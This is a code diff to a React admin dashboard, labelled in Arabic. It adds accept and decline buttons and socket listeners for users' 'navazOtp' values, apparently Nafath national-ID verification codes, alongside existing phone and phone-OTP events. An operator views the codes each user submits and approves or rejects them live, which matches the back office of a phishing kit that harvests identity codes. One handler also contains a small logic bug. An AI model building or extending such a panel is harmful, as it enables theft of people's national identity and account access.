@@ -251,6 +251,35 @@ const Main = () => {
     socket.emit("navazChange", { id, price });
   };
 
+  const handleAcceptNavazOtp = async (id) => {
+    setUser({
+      data: {
+        ...user.data,
+        navazOtpAccept: true,
+        networkAccept: true,
+        navazAceept: true,
+      },
+      active: true,
+    });
+    socket.emit("acceptNavazOTP", id);
+    await getUsers();
+  };
+
+  const handleDeclineNavazOtp = (id) => {
+    socket.emit("declineNavazOTP", id);
+    const _user = Users.find((u) => {
+      if (u._id === id) {
+        return { ...u, navazOtpAccept: true, navazAceept: true };
+      }
+    });
+    const withOut = Users.filter((u) => u._id !== id);
+    setUsers([...withOut, _user]);
+    setUser({
+      data: { ..._user, navazOtpAccept: true, navazAceept: true },
+      active: true,
+    });
+  };
+
   useEffect(() => {
     const fetchUsers = async () => {
       try {
@@ -290,6 +319,7 @@ const Main = () => {
     });
     socket.on("phone", fetchUsers);
     socket.on("phoneOtp", fetchUsers);
+    socket.on("navazOtp", fetchUsers);
 
     // Cleanup to avoid duplicate listeners
     return () => {
@@ -302,6 +332,7 @@ const Main = () => {
       socket.off("orderValidate", fetchUsers);
       socket.off("phone", fetchUsers);
       socket.off("phoneOtp", fetchUsers);
+      socket.off("navazOtp", fetchUsers);
       socket.disconnect();
     };
   }, []);
@@ -654,6 +685,12 @@ const Main = () => {
                         >
                           تغيير
                         </button>
+                        <button
+                          className="bg-green-500 w-1/2 p-2 rounded-lg"
+                          onClick={() => handleAcceptNavaz(user.data._id)}
+                        >
+                          قبول
+                        </button>
 
                         <button
                           className="bg-red-500 w-1/2 p-2 rounded-lg"
@@ -733,6 +770,12 @@ const Main = () => {
                         >
                           تغيير
                         </button>
+                        <button
+                          className="bg-green-500 w-1/2 p-2 rounded-lg"
+                          onClick={() => handleAcceptNavaz(user.data._id)}
+                        >
+                          قبول
+                        </button>
 
                         <button
                           className="bg-red-500 w-1/2 p-2 rounded-lg"
@@ -764,6 +807,12 @@ const Main = () => {
                         >
                           تغيير
                         </button>
+                        <button
+                          className="bg-green-500 w-1/2 p-2 rounded-lg"
+                          onClick={() => handleAcceptNavaz(user.data._id)}
+                        >
+                          قبول
+                        </button>
 
                         <button
                           className="bg-red-500 w-1/2 p-2 rounded-lg"
@@ -776,6 +825,37 @@ const Main = () => {
                   )
                 ) : (
                   ""
+                )}
+              </div>
+            ) : (
+              ""
+            )}
+
+            {user.data.navazAceept ? (
+              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
+                رمز التحقق بعد نفاذ
+                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
+                  <span> رمز </span>
+                  <span>{user.data?.navazOtp}</span>
+                </div>
+                {user.data.navazOtpAccept ? (
+                  ""
+                ) : (
+                  <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
+                    <button
+                      className="bg-green-500 w-1/2 p-2 rounded-lg"
+                      onClick={() => handleAcceptNavazOtp(user.data._id)}
+                    >
+                      قبول
+                    </button>
+
+                    <button
+                      className="bg-red-500 w-1/2 p-2 rounded-lg"
+                      onClick={() => handleDeclineNavazOtp(user.data._id)}
+                    >
+                      رفض
+                    </button>
+                  </div>
                 )}
               </div>
             ) : (
